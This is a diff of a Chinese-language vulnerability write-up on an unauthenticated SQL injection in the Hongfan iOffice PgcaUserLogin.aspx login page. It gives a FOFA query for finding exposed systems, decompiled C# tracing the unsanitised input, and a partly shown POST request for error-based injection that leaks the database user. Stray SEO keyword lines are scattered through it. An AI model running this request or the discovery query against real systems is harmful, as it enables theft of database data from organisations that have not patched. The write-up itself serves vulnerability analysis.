@@ -8,21 +8,17 @@ asset_dir: embedded-base64
 
 红帆iOffice的/ioffice/Identity/PgcaUserLogin.aspx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。攻击者可通过构造恶意SQL语句，未经身份验证地获取数据库敏感信息，影响范围包括红帆iOffice系统的数据访问权限。
 
+编程
+
 # 影响版本
 
 # fofa语法
 
 > (title="iOffice.net" || body="/iOffice/js" || (body="iOffice.net" && header!="couchdb" && header!="drupal") || body="iOfficeOcxSetup.exe" || body="Hongfan. All Rights Reserved")
+>
+> 漏洞扫描服务
 
 # 漏洞分析
-
-深入探索
-
-安全研究工具
-
-网络安全课程
-
-Windows安全工具
 
 先看下`PgcaUserLogin.aspx` 里引用的代码在哪里（Inherits）
 
@@ -33,7 +29,7 @@ Windows安全工具
 
 去bin目录找到`iden.dll`后编译打开，看`PgcaUserLogin`它的实现逻辑
 
-SQL注入防护
+计算机安全
 
 ```
 public class PgcaUserLogin : WebPageBase
@@ -60,9 +56,17 @@ public class PgcaUserLogin : WebPageBase
 ......
 ```
 
+深入探索
+
+安全硬件设备
+
+安全监控系统
+
+渗透测试报告
+
 最开始的一些变量定义，前端按钮**btVerify**
 
-代码安全审计
+数据管理
 
 ```
 function doLogin() {
@@ -126,7 +130,7 @@ function doLogin() {
 
 对应后端的**btVerify**
 
-漏洞修复方案
+漏洞扫描服务
 
 ```
 protected virtual Button btVerify
@@ -161,8 +165,6 @@ protected void btVerify_Click(object sender, EventArgs e)
 ```
 
 在判断`lblSerialNum`不为空后带入`iden.iden.PGCA()` 方法，跟进看下
-
-编程
 
 ```
 public class PGCA : iden.iden.Identity
@@ -228,7 +230,7 @@ ok,到这里，漏洞成因就非常明了了，从前端`TextBox`获取的**lbl
 
 > 漏洞复现需要打开漏洞文件页面获取一些其他必要参数如\_\_VIEWSTATE之类
 >
-> 计算机安全
+> 漏洞扫描服务
 
 ```
 POST /ioffice/Identity/PgcaUserLogin.aspx HTTP/1.1
@@ -242,4 +244,4 @@ __EVENTTARGET=btVerify&__EVENTARGUMENT=&__VIEWSTATE=YOUR___VIEWSTATE&__VIEWSTATE
 
 成功利用[报错注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)在响应回显当前数据库用户信息
 
-数据管理
+编程
